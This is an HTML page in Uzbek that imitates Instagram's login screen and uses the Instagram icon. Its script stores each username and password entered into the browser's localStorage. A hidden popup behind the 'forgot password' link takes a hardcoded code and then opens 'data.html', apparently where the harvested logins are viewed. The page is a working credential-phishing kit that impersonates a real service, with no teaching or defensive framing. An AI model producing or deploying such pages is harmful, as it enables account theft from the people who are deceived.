<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>

<style>
body{
  margin:0;
  background:#000;
  font-family:Arial;
  color:#fff;
}

/* TOP BAR */
.top{
  display:flex;
  justify-content:space-between;
  padding:15px;
  color:#aaa;
  font-size:14px;
}

/* MAIN */
.container{
  display:flex;
  flex-direction:column;
  align-items:center;
  margin-top:50px;
}

/* ICON FRAME */
.logo-card{
  width:110px;
  height:110px;
  background:#111;
  border:1px solid #333;
  border-radius:20px;
  display:flex;
  align-items:center;
  justify-content:center;
  margin-bottom:25px;
  overflow:hidden; /* 🔥 muhim */
  box-shadow:0 0 15px rgba(255,255,255,0.05);
}

/* ICON IMAGE */
.logo-card img{
  width:100%;
  height:100%;
  object-fit:cover; /* 🔥 ramkaga mos */
  transform:scale(1.05);
}

/* INPUT */
input{
  width:85%;
  max-width:320px;
  padding:14px;
  margin:6px 0;
  background:#121212;
  border:1px solid #333;
  border-radius:10px;
  color:#fff;
  outline:none;
}

/* BUTTON */
button{
  width:85%;
  max-width:320px;
  padding:14px;
  margin-top:10px;
  background:#1877f2;
  border:none;
  border-radius:25px;
  color:#fff;
  font-weight:bold;
  cursor:pointer;
}

/* FORGOT */
.forgot{
  margin-top:15px;
  color:#ccc;
  font-size:14px;
  cursor:pointer;
}

/* POPUP */
.popup{
  display:none;
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.7);
  justify-content:center;
  align-items:center;
}

.box{
  width:300px;
  background:#1b1b20;
  padding:20px;
  border-radius:12px;
}

.box input{
  width:100%;
}

.close{
  background:red;
  margin-top:10px;
}
</style>
</head>

<body>

<div class="top">
  <div>←</div>
  <div>O'zbek ▼</div>
  <div></div>
</div>

<div class="container">

  <!-- ICON -->
  <div class="logo-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
  </div>

  <input type="text" id="user" placeholder="Telefon, email yoki login">
  <input type="password" id="pass" placeholder="Parol">

  <button onclick="save()">Kirish</button>

  <div class="forgot" onclick="openPopup()">Parolni unutdingizmi?</div>

</div>

<!-- POPUP -->
<div class="popup" id="popup">
  <div class="box">
    <h3>Parolni kiriting</h3>
    <input type="password" id="code" placeholder="12345">
    <button onclick="check()">Kirish</button>
    <button class="close" onclick="closePopup()">Yopish</button>
  </div>
</div>

<script>

// SAVE USER
function save(){
  let user = document.getElementById("user").value;
  let pass = document.getElementById("pass").value;

  if(user === "" || pass === ""){
    alert("To‘ldiring");
    return;
  }

  let users = JSON.parse(localStorage.getItem("users")) || [];
  users.push({user, pass});
  localStorage.setItem("users", JSON.stringify(users));

  alert("Saqlandi ✔");
}

// OPEN POPUP
function openPopup(){
  document.getElementById("popup").style.display = "flex";
}

// CLOSE POPUP
function closePopup(){
  document.getElementById("popup").style.display = "none";
}

// CHECK PASSWORD
function check(){
  let code = document.getElementById("code").value;

  if(code === "56964"){
    window.location.href = "data.html";
  } else {
    alert("Noto‘g‘ri parol!");
  }
}

</script>

</body>
</html>
